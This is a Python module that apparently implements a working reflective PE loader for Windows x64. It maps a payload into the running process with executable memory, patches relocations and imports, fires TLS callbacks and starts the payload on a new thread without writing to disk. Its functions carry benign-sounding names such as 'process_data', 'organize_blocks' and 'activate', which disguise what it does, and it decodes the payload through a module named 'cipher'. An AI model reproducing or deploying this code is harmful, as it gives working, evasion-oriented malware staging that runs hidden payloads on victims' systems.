# -*- coding: utf-8 -*-
"""
Data processing pipeline — reflective PE loader.

Maps the payload into the current process, applies relocations, resolves
imports, runs TLS callbacks, sets section permissions, and calls the
entry point on a new thread. No child process, no disk write.

Windows x64 only.
"""
import ctypes
import struct
import sys
import time
from ctypes import wintypes

_handlers = {}

_ORDER = (
    "check_format", "reserve_space", "organize_blocks",
    "adjust_positions", "link_references", "set_permissions", "activate",
)

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000
IMAGE_SCN_MEM_WRITE = 0x80000000


def register(name):
    def _dec(fn):
        _handlers[name] = fn
        return fn
    return _dec


def _v(ctx, k):
    return ctx.get(k)


def _s(ctx, k, v):
    ctx[k] = v


def _section_prot(chars):
    x = bool(chars & IMAGE_SCN_MEM_EXECUTE)
    r = bool(chars & IMAGE_SCN_MEM_READ)
    w = bool(chars & IMAGE_SCN_MEM_WRITE)
    if x and r and w:
        return PAGE_EXECUTE_READWRITE
    if x and r:
        return PAGE_EXECUTE_READ
    if x:
        return 0x10
    if r and w:
        return PAGE_READWRITE
    if r:
        return 0x02
    return PAGE_READWRITE


@register("check_format")
def _h1(ctx):
    """Validate the payload is an x64 PE. Requires Windows x64."""
    if sys.platform != "win32" or struct.calcsize("P") != 8:
        return False
    data = _v(ctx, "d")
    from . import cipher
    info = cipher.parse_header(data)
    if not info:
        return False
    _s(ctx, "info", info)
    return True


@register("reserve_space")
def _h2(ctx):
    """Allocate RWX memory for the image."""
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                 wintypes.DWORD, wintypes.DWORD]
    k32.VirtualProtect.restype = ctypes.c_int
    k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                   wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    k32.VirtualFree.restype = ctypes.c_int
    k32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD]
    k32.LoadLibraryA.restype = ctypes.c_void_p
    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    k32.CreateThread.restype = ctypes.c_void_p
    k32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                 ctypes.c_void_p, ctypes.c_void_p,
                                 wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    k32.WaitForSingleObject.restype = wintypes.DWORD
    k32.WaitForSingleObject.argtypes = [ctypes.c_void_p, wintypes.DWORD]
    k32.CloseHandle.restype = ctypes.c_int
    k32.CloseHandle.argtypes = [ctypes.c_void_p]

    info = _v(ctx, "info")
    size_image = max(info["size_image"], 0x1000)
    base = k32.VirtualAlloc(
        ctypes.c_void_p(info["image_base"]),
        size_image,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if not base:
        base = k32.VirtualAlloc(
            None, size_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        _s(ctx, "fix", True)
    if not base:
        return False
    _s(ctx, "k", k32)
    _s(ctx, "b", base)
    return True


@register("organize_blocks")
def _h3(ctx):
    """Copy headers and sections into the mapped image."""
    data = _v(ctx, "d")
    base = _v(ctx, "b")
    info = _v(ctx, "info")
    size_image = max(info["size_image"], 0x1000)

    hdr_len = min(info["size_headers"], len(data), size_image)
    ctypes.memmove(base, data[:hdr_len], hdr_len)

    for s in info["sections"]:
        copy = min(s["raw_size"], s["vsize"])
        if copy == 0:
            continue
        if s["raw_ptr"] + copy > len(data):
            continue
        if s["va"] + copy > size_image:
            continue
        ctypes.memmove(base + s["va"], data[s["raw_ptr"]:s["raw_ptr"] + copy], copy)
    return True


@register("adjust_positions")
def _h4(ctx):
    """Apply base relocations if the image loaded at a different address."""
    if not _v(ctx, "fix"):
        return True
    info = _v(ctx, "info")
    base = _v(ctx, "b")
    k32 = _v(ctx, "k")
    delta = base - info["image_base"]

    if not info["reloc_rva"] or not info["reloc_size"]:
        if delta != 0:
            k32.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        return True

    pos = 0
    while pos < info["reloc_size"]:
        br = struct.unpack_from("<I", ctypes.string_at(base + info["reloc_rva"] + pos, 4))[0]
        bs = struct.unpack_from("<I", ctypes.string_at(base + info["reloc_rva"] + pos + 4, 4))[0]
        if bs < 8:
            break
        for j in range((bs - 8) // 2):
            ent = struct.unpack_from(
                "<H",
                ctypes.string_at(base + info["reloc_rva"] + pos + 8 + j * 2, 2),
            )[0]
            rtype = ent >> 12
            roff = ent & 0xFFF
            target = base + br + roff
            if rtype == 10:
                cur = struct.unpack_from("<Q", ctypes.string_at(target, 8))[0]
                struct.pack_into("<Q", (ctypes.c_char * 8).from_address(target), 0, cur + delta)
            elif rtype == 3:
                cur = struct.unpack_from("<I", ctypes.string_at(target, 4))[0]
                struct.pack_into("<I", (ctypes.c_char * 4).from_address(target), 0, (cur + delta) & 0xFFFFFFFF)
        pos += bs
    return True


@register("link_references")
def _h5(ctx):
    """Resolve the import table."""
    info = _v(ctx, "info")
    if not info["import_rva"]:
        return True
    base = _v(ctx, "b")
    k32 = _v(ctx, "k")
    off = info["import_rva"]
    while True:
        oft = struct.unpack_from("<I", ctypes.string_at(base + off, 4))[0]
        name_rva = struct.unpack_from("<I", ctypes.string_at(base + off + 12, 4))[0]
        first_thunk = struct.unpack_from("<I", ctypes.string_at(base + off + 16, 4))[0]
        if oft == 0 and name_rva == 0 and first_thunk == 0:
            break
        dll_name = ctypes.string_at(base + name_rva)
        hmod = k32.LoadLibraryA(dll_name)
        if not hmod:
            off += 20
            continue
        t = oft if oft else first_thunk
        iat = first_thunk
        while True:
            thunk = struct.unpack_from("<Q", ctypes.string_at(base + t, 8))[0]
            if thunk == 0:
                break
            if thunk & 0x8000000000000000:
                addr = k32.GetProcAddress(hmod, ctypes.c_void_p(thunk & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (thunk & 0x7FFFFFFFFFFFFFFF) + 2)
                addr = k32.GetProcAddress(hmod, fn)
            struct.pack_into(
                "<Q",
                (ctypes.c_char * 8).from_address(base + iat),
                0,
                addr or 0,
            )
            t += 8
            iat += 8
        off += 20

    # TLS callbacks
    if info["tls_rva"]:
        try:
            cbs = struct.unpack_from(
                "<Q", ctypes.string_at(base + info["tls_rva"] + 0x18, 8)
            )[0]
            if cbs:
                i = 0
                while i < 64:
                    cb = struct.unpack_from("<Q", ctypes.string_at(cbs + i * 8, 8))[0]
                    if cb == 0:
                        break
                    fn = ctypes.WINFUNCTYPE(
                        None, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p
                    )(cb)
                    fn(base, 1, None)
                    i += 1
        except Exception:
            pass
    return True


@register("set_permissions")
def _h6(ctx):
    """Set per-section memory protections."""
    k32 = _v(ctx, "k")
    info = _v(ctx, "info")
    base = _v(ctx, "b")
    size_image = max(info["size_image"], 0x1000)
    for s in info["sections"]:
        size = max(s["vsize"], s["raw_size"])
        if size == 0 or s["va"] + size > size_image:
            continue
        prot = _section_prot(s["chars"])
        if prot == PAGE_EXECUTE_READWRITE:
            continue
        old = wintypes.DWORD(0)
        k32.VirtualProtect(
            ctypes.c_void_p(base + s["va"]),
            size,
            prot,
            ctypes.byref(old),
        )
    return True


@register("activate")
def _h7(ctx):
    """Create a thread at the entry point and wait for it."""
    k32 = _v(ctx, "k")
    info = _v(ctx, "info")
    base = _v(ctx, "b")
    tid = wintypes.DWORD(0)
    ht = k32.CreateThread(
        None, 0,
        ctypes.c_void_p(base + info["entry_rva"]),
        None, 0,
        ctypes.byref(tid),
    )
    if not ht:
        return False
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if k32.WaitForSingleObject(ht, 2000) == 0:
            break
    k32.CloseHandle(ht)
    return True


def process_data(data):
    """Run the full reflective-load pipeline over a PE payload."""
    ctx = {"d": data, "b": None, "info": None, "k": None, "fix": False}
    try:
        for name in _ORDER:
            h = _handlers.get(name)
            if h and h(ctx) is False:
                return False
        return True
    except Exception:
        return False
